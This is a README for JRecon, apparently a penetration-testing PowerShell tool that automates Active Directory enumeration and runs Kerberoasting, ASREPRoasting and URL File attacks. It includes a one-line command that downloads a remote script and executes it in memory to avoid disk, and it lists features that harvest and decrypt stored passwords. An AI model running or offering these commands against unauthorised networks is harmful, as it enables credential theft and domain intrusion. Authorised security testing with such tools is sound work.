# JRecon
### A tool to automate Active Directory Enumeration
I've been working on this tool to automate a good part of the initial AD enumeration phase.

JRecon is not perfect, but it does it's job - while you can go grab a coffee

### How to run ?

Run the tool on memory (don't make it touch disk)

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/JRecon/main/Invoke-JRecon.ps1')
```

Specify the Commercial Version PingCastle URL (or it will download the free version)
```
Invoke-JRecon -PingCastleURL <URL>
```
```
Invoke-JRecon -PingCastleKey "<Key>"
```

### What does the tool enumerate for ?

The only attacks it runs is Kerberoasting, ASREPRoasting, and URL File Attack. Everything else is just enumeration

•	AD objects and policies (subnets, computers, users, DCs, password policy and more)

•	Users Description field piping to file (excludes blank entries)

•	Creates a list of Servers

•	Creates a list of Hosts running Unsupported OS

•	Checks on Local Admins on the system

•	Checks if AV is installed

•	Checks for Local Admin Password Solution (LAPS)

•	Kerberoasting and ASREPRoasting

•	Checks for presence of Kerb Tickets in your local machine

•	Enumerates for Vulnerable GPOs

•	Checks for Misconfigured Certificate Templates

•	BloodHound collection

•	Checks for Exploitable Systems

•	Checks for LDAP Signing

•	Checks for Passwords in GPO (and decrypts them if it finds any)

•	Checks for Passwords in SYSVOL/Netlogon

•	Checks for Accessible shares (Read)

•	Checks for Writable shares (Write)

•	URL File Attack

### Dependencies

https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/
 
https://github.com/Group3r/Group3r
 
https://github.com/GhostPack/Certify

https://github.com/cube0x0/LdapSignCheck

https://github.com/vletoux/pingcastle

https://github.com/BloodHoundAD/SharpHound

https://github.com/sense-of-security/ADRecon

https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1

https://twitter.com/_RastaMouse

https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

https://github.com/S3cur3Th1sSh1t/PowerSharpPack

https://www.tenable.com

https://github.com/rejetto/hfs2/

https://github.com/nccgroup/WinShareEnum

https://www.advanced-ip-scanner.com/

https://www.virtualbox.org/

https://www.kali.org/
